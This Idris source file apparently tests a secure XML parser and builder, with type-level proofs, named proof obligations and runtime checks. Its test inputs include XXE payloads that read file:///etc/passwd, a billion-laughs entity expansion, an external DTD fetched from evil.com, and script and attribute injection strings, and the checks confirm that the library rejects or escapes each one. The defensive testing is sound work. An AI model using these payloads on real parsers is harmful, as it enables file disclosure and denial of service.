-- SPDX-License-Identifier: MPL-2.0
-- SPDX-FileCopyrightText: 2025 Hyperpolymath
module SafeXMLProps

import Proven.Core
-- Parser-level properties are stated as obligations indexed by the parser and
-- exercised on `parseXMLWith` below.
import Proven.SafeXML.Types
import Proven.SafeXML.Builder
import Proven.SafeXML.Proofs
import Proven.SafeXML.Parser
import Data.String
import System
import KnownDefects

%default total

--------------------------------------------------------------------------------
-- Type-level proofs
--------------------------------------------------------------------------------

||| Secure defaults forbid DTDs (configuration half of prop_externalDTDBlocked).
prop_secureDefaultsBlockDTD : Types.secureDefaults.allowDTD = False
prop_secureDefaultsBlockDTD = Refl

||| Secure defaults forbid external entities (configuration half of prop_xxeBlocked).
prop_secureDefaultsBlockXXE : Types.secureDefaults.allowExternalEntities = False
prop_secureDefaultsBlockXXE = Refl

||| Even the permissive options never allow external entities.
prop_permissiveStillBlocksXXE : Types.permissiveOptions.allowExternalEntities = False
prop_permissiveStillBlocksXXE = Refl

||| Secure defaults allow no entity definitions and zero expansions
||| (configuration half of prop_billionLaughsBlocked).
prop_secureDefaultsNoExpansion :
  (Types.secureDefaults.allowInternalEntities, Types.secureDefaults.maxEntityExpansions) = (False, 0)
prop_secureDefaultsNoExpansion = Refl

||| A document with no root element is rejected by the builder.
prop_documentNeedsRoot : isErr (buildDocument Builder.document) = True
prop_documentNeedsRoot = Refl

--------------------------------------------------------------------------------
-- Outstanding obligations (named propositions, not witnesses)
--------------------------------------------------------------------------------

||| Shape of the secure parser, `Proven.SafeXML.Parser.parseXMLWith`.
public export
XMLParser : Type
XMLParser = XMLSecurityOptions -> String -> XMLResult XMLDocument

||| OWED: a well-formed document parses under secure defaults (was
||| prop_validXMLParses). Blocked by: no proof over the parser's String
||| loops; executed below on `parseXMLWith`. This names the proposition; it is not a witness.
public export
XmlWellFormedAcceptedObligation : XMLParser -> Type
XmlWellFormedAcceptedObligation p =
  isOk (p secureDefaults "<root><child>text</child></root>") = True

||| OWED: an unclosed element is rejected (was prop_unclosedTagFails).
||| Blocked by: no proof over the parser; executed below. This names the proposition;
||| it is not a witness.
public export
XmlUnclosedRejectedObligation : XMLParser -> Type
XmlUnclosedRejectedObligation p = isErr (p secureDefaults "<root><child>") = True

||| OWED: mismatched tags are rejected (was prop_mismatchedTagsFail).
||| Blocked by: no proof over the parser; executed below. This names the proposition; it is not a witness.
public export
XmlMismatchedRejectedObligation : XMLParser -> Type
XmlMismatchedRejectedObligation p = isErr (p secureDefaults "<root></other>") = True

||| OWED: an XXE payload is rejected (was prop_xxeBlocked).
||| Blocked by: no proof over the parser; executed below. This names the proposition; it is not a witness.
public export
XmlXxeRejectedObligation : XMLParser -> Type
XmlXxeRejectedObligation p =
  isErr (p secureDefaults
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>") = True

||| OWED: a billion-laughs payload is rejected (was prop_billionLaughsBlocked).
||| Blocked by: no proof over the parser; executed below. This names the proposition; it is not a witness.
public export
XmlBillionLaughsRejectedObligation : XMLParser -> Type
XmlBillionLaughsRejectedObligation p =
  isErr (p secureDefaults
    "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><lolz>&lol2;</lolz>") = True

||| OWED: an external DTD reference is rejected (was prop_externalDTDBlocked).
||| Blocked by: no proof over the parser; executed below. This names the proposition; it is not a witness.
public export
XmlExternalDtdRejectedObligation : XMLParser -> Type
XmlExternalDtdRejectedObligation p =
  isErr (p secureDefaults "<!DOCTYPE foo SYSTEM \"http://evil.com/xxe.dtd\"><foo/>") = True

||| OWED: with DTDs disabled, any input carrying a DOCTYPE is rejected; entity
||| definitions need a DTD, so this bounds entity expansion (was
||| prop_entityExpansionLimited; `entityCount` never existed). Blocked by: no
||| proof over the parser, and `isInfixOf` over an abstract String does not reduce.
||| This names the proposition; it is not a witness.
public export
XmlDtdRejectedObligation : XMLParser -> Type
XmlDtdRejectedObligation p =
  (opts : XMLSecurityOptions) -> opts.allowDTD = False ->
  (xml : String) -> isInfixOf "<!DOCTYPE" xml = True ->
  isErr (p opts xml) = True

||| OWED: an escaped attribute value contains no raw quote or angle bracket
||| (was prop_escapeAttrSafe; `isValidAttrValue` never existed). Blocked by:
||| `pack`/`unpack` over an abstract String do not reduce, and the per-character
||| escaper is private. This names the proposition; it is not a witness.
public export
XmlAttrEscapeSafeObligation : Type
XmlAttrEscapeSafeObligation =
  (s : String) ->
  all (\c => not (c `elem` ['"', '\'', '<', '>'])) (unpack (xmlAttrValue s).escaped) = True

--------------------------------------------------------------------------------
-- Execution checks
--------------------------------------------------------------------------------

private
check : String -> Bool -> IO ()
check label True = putStrLn ("PASS (execution): " ++ label)
check label False = do
  putStrLn ("FAIL: " ++ label)
  exitFailure

private
renders : XMLResult XMLNode -> String -> Bool
renders (Ok n) expected = renderNode n == expected
renders (Err _) _ = False

private
hostile : List String
hostile = ["<!DOCTYPE x>", "<!ENTITY a SYSTEM \"file:///etc/passwd\">", "]]><x/>",
           "\"' onload=\"x", "&xxe;", "</p><script>"]

private
noMarkupInjected : String -> Bool
noMarkupInjected s =
  case textElement "p" s of
    Ok n => let out = renderNode n in
            not (isInfixOf "<!DOCTYPE" out) && not (isInfixOf "<!ENTITY" out) &&
            not (isInfixOf "<script>" out)
    Err _ => False


private
xxeDoc, lolDoc, extDtdDoc : String
xxeDoc = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
lolDoc = "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><lolz>&lol2;</lolz>"
extDtdDoc = "<!DOCTYPE foo SYSTEM \"http://evil.com/xxe.dtd\"><foo/>"

private
isXxe : XMLResult XMLDocument -> Bool
isXxe (Err (ExternalEntityDetected _)) = True
isXxe _ = False

private
isDtdNotAllowed : XMLResult XMLDocument -> Bool
isDtdNotAllowed (Err DTDNotAllowed) = True
isDtdNotAllowed _ = False

||| Test runner for XML properties
export
runXMLProperties : IO ()
runXMLProperties = do
  putStrLn "SafeXML Property Tests"
  putStrLn "======================"
  putStrLn "prop_secureDefaultsBlockDTD: PASS (proven by type)"
  putStrLn "prop_secureDefaultsBlockXXE: PASS (proven by type)"
  putStrLn "prop_permissiveStillBlocksXXE: PASS (proven by type)"
  putStrLn "prop_secureDefaultsNoExpansion: PASS (proven by type)"
  putStrLn "prop_documentNeedsRoot: PASS (proven by type)"
  check "prop_escapeSpecialChars: attribute escaping of < > & \" '"
    ((xmlAttrValue "<>&\"'").escaped == "&lt;&gt;&amp;&quot;&#39;")
  check "text escaping of < > & (quotes may stay raw in text)"
    ((xmlText "<a>&\"").escaped == "&lt;a&gt;&amp;\"")
  check "prop_validElementName: myElement accepted"
    (isOk (xmlName "myElement") && isValidXMLName "myElement")
  check "prop_invalidElementNameNum: leading digit, empty, space rejected"
    (isErr (xmlName "123element") && isErr (xmlName "") && isErr (xmlName "a b"))
  check "rendered text element escapes its content"
    (renders (textElement "p" "<b>&") "<p>&lt;b&gt;&amp;</p>")
  check "rendered attribute escapes a quote"
    (renders (attrTextElement "a" [("href", "x\"y")] "t") "<a href=\"x&quot;y\">t</a>")
  check "prop_xxeBlocked (builder side): hostile text cannot inject DOCTYPE/ENTITY/tags"
    (all noMarkupInjected hostile)
  check "prop_escapeAttrSafe: escaped attribute values carry no raw quote or bracket"
    (all (\s => all (\c => not (c `elem` ['"', '\'', '<', '>']))
                    (unpack (xmlAttrValue s).escaped)) hostile)
  -- Parser (instances of the obligations above)
  check "prop_validXMLParses: well-formed document accepted"
    (isOk (parseXMLWith secureDefaults "<root><child>text</child></root>"))
  check "prop_unclosedTagFails" (isErr (parseXMLWith secureDefaults "<root><child>"))
  check "prop_mismatchedTagsFail" (isErr (parseXMLWith secureDefaults "<root></other>"))
  check "prop_xxeBlocked: external entity rejected as ExternalEntityDetected"
    (isXxe (parseXMLWith secureDefaults xxeDoc))
  check "prop_billionLaughsBlocked: rejected" (isErr (parseXMLWith secureDefaults lolDoc))
  check "prop_externalDTDBlocked: rejected" (isErr (parseXMLWith secureDefaults extDtdDoc))
  -- Known defect: those two rejections come from the DOCTYPE never being parsed.
  knownDefect XmlDoctypeUnparsed "billion laughs rejected as DTDNotAllowed"
    (isDtdNotAllowed (parseXMLWith secureDefaults lolDoc))
  knownDefect XmlDoctypeUnparsed "external DTD rejected as DTDNotAllowed"
    (isDtdNotAllowed (parseXMLWith secureDefaults extDtdDoc))
  putStrLn ""
